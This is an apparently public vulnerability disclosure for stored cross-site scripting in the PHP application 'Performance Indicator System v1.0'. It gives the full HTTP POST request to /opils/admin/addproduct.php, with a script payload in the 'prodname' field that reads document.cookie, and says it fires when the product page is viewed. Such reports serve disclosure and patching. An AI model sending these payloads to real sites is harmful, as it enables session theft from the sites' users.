# Performance Indicator System v1.0 has stored cross-site scripting

BUG_Author: BaiXiJun

Website source code address: https://www.sourcecodester.com/php/11638/performance-indicator-system.html

Vulnerability File: /opils/admin/addproduct.php

post form parameters "prodname" exists stored cross-site scripting vulnerability

```
POST /opils/admin/addproduct.php HTTP/1.1
Host: localhost
Content-Length: 708
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiJHYays1OlY0KkQr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/opils/admin/product.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: __atuvc=2%7C20; PHPSESSID=k9h36uumt85ueqglvvv3imaap0
Connection: close

------WebKitFormBoundaryiJHYays1OlY0KkQr
Content-Disposition: form-data; name="prodname"

<script>alert(document.cookie)</script>
------WebKitFormBoundaryiJHYays1OlY0KkQr
Content-Disposition: form-data; name="prodcategory"

1
------WebKitFormBoundaryiJHYays1OlY0KkQr
Content-Disposition: form-data; name="proprice"

1
------WebKitFormBoundaryiJHYays1OlY0KkQr
Content-Disposition: form-data; name="prodpromo"

0
------WebKitFormBoundaryiJHYays1OlY0KkQr
Content-Disposition: form-data; name="pqty"

2
------WebKitFormBoundaryiJHYays1OlY0KkQr
Content-Disposition: form-data; name="image"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryiJHYays1OlY0KkQr--
```

Payload will trigger when a user visits on http://localhost/opils/admin/product.php

![image](https://github.com/wenwochunfeng/bugReport/blob/main/1.png)
